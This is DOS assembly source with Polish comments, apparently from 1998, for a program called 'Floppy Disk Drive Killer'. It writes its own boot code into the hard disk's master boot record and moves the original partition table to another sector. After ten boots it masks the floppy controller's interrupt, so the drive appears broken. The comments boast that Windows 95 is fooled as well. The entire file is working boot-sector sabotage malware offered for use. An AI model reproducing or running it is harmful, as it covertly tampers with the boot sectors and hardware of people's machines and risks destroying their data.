;Program (FDDKILL.ASM) napisany przez M$(1998).
;Opis:
; Program ten instaluje dwie procedury:
;  - FloppyKiller w 3 sektorze dysku twardego,
;  - Partition w 1 sektorze dysku twardego.
; Orginalna tablica partycji zostaje przeniesiona do 2 sektora dysku twardrgo.
; Procedura Partition wczytuje i uruchamia procedure FloppyKiller. Procedura FloppyKiller
; posiada licznik. Jezeli osiagnie on wartosc 10 to zostaje wylaczone sprzetowe przerwanie IRQ #6.
; Powoduje to ze stacja dyskietek zachowuje sie jak uszkodzona.
; Nawet Windows 95 daje sie na to zlapac...

.Model Tiny
.Data
 Bufor db 512 dup (0)
 Uni db 'UnInstalled succefully.',13,10,'$'
 Msg db 'installed succefully.',13,10,'$'
 Ero db '(Un)Install error.',13,10,'$'
 Inf db 10,10,'FLOPPY DISK DRIVE KILLER by MS(1998)...','$'

 Licznik = 10     ; za ktorym razem ma zostac uaktywniona procedura FDDKill

.Code
 Org 100h

 Begin:
  jmp Check       ; skok do poczatku programu

  Partition:      ; Procedura Partition
   xor ax,ax
   mov ss,ax
   mov sp,7c00h   ; stos jest ustawiany tak jak w orginale
   mov ax,9000h
   mov es,ax      ; es:bx = [9000:0000] - adres pod ktory zostanie wczytana procedura FloppyKiller
   xor bx,bx
   mov ax,0201h
   mov cx,0003h   ; 3 sektor
   mov dx,0080h
   push es        ; adres es:bx na stos
   push bx
   int 13h        ; odczyt sektora 3
   retf           ; uruchomienie procedury FlopyKiller...
   Pointer db 'Floppy Killer by M$(1998)',0  ; Znacznik

  FloppyKillerCode:  ; Procedura FlopyKiller
   cmp byte ptr cs:[Check-FloppyKillerCode-1],Licznik ; sprawdzenie licznika
   je KillFDD
   add byte ptr cs:[Check-FloppyKillerCode-1],1  ; zwiekszenie go o 1
   mov ax,9000h
   mov es,ax
   mov ax,0301h
   mov cx,0003h
   mov dx,0080h
   mov bx,0000h
   int 13h         ; zapisanie calej procedury z zwiekszonym licznikem
   jmp LoadOldPart ; skok do procedury ladujacej orginalny boot rekord

  KillFDD:         ; procedura wylaczajaca IRQ #6 - przerwanie sprzetowe FDD
   mov dx,21h
   in al,dx        ; al - zawartosc portu 21h
   or al,40h       ; wyzerowanie 6 bitu
   out dx,al       ; i z powrotem do portu 21h

  LoadOldPart:     ; ladowanie orginalnego Boot Rekordu
   xor ax,ax
   mov es,ax
   mov ax,0201h
   mov cx,0002h
   mov dx,0080h
   mov bx,7c00h
   push es
   push bx
   int 13h       ; zaladowanie go pod adres 0000:7c00h
   retf          ; i uruchomienie go...
   counter db 0  ; liczink
  FloppyKillerEndOfCode:

  Check:
   mov ah,09h
   lea dx,Inf
   int 21h             ; informacja
   mov ax,0201h
   mov cx,0001h
   mov dx,0080h
   mov bx,Offset Bufor
   int 13h             ; odczyt tablicy partycji do bufora

   mov cx,(FloppyKillerCode-Partition)  ; cx = dlugosc procedury Partition
   mov si,Offset Partition
   mov di,Offset Bufor
   cld
   rep cmpsb                            ; sprawdzenie czy jest juz zainstalowany
   jne Install                          ; jezeli nie to instaluj

  UnInstall:                            ; Deinstalacja programu
   mov ax,0201h
   mov cx,0002h
   mov dx,0080h
   mov bx,Offset Bufor
   int 13h                              ; Odczyt 2 sektora (orginalna tablica partycji)
   mov ax,0301h
   mov cl,1h
   int 13h                              ; przepisanie jej do 1 sektora
   mov di,offset Bufor
   mov cx,256
   xor ax,ax
   cld
   rep stosw                            ; wyczyszczenie bufora
   mov ax,0301h
   mov cx,0002h
   int 13h                              ; wyczyszczenie zainfekowanych sektorow
   mov ax,0301h
   inc cx
   int 13h
   mov ah,09h
   lea dx,Uni
   int 21h        ; informacja o deinstalacji
   ret            ; zakonczenie programu

  Install:        ; czesc instalacyjna programu
   mov ax,0301h
   mov cl,2h
   int 13h        ; Przesuniecie orinalnej tablicy partycji do 2 sektora
   jc Error
   mov cx,(FloppyKillerCode-Partition)  ; cx = dlugosc procedury Partition
   mov si,offset Partition
   mov di,offset Bufor
   cld
   rep movsb      ; zmiana kodu boot-rekordu

   mov ax,0301h
   mov cx,0001h
   int 13h        ; Zapis tablicy partycji z nowym boot-rekordem do 1 sektora
   jc Error

   mov di,offset Bufor         ; wyczyszczenie bufora
   mov cx,256
   xor ax,ax
   cld
   rep stosw

   mov cx,(FloppyKillerEndOfCode-FloppyKillerCode) ; cx = dlugosc procedury FloppyKiller
   mov si,offset FloppyKillerCode
   mov di,offset Bufor
   cld
   rep movsb
   mov ax,0301h
   mov cx,0003h
   int 13h      ; zapis procedury FloppyKiller do 3 sektora
   jc Error

   mov ah,09h
   lea dx,Msg
   int 21h      ; informacja o poprawnym zainstalowaniu
   ret          ; zakonczenie dzialania programu

  Error:
   mov ah,09h
   lea dx,Ero
   int 21h      ; informacja: wystapil blad w czasie instalacji
   ret          ; zakonczenie dzialania programu

  End Begin






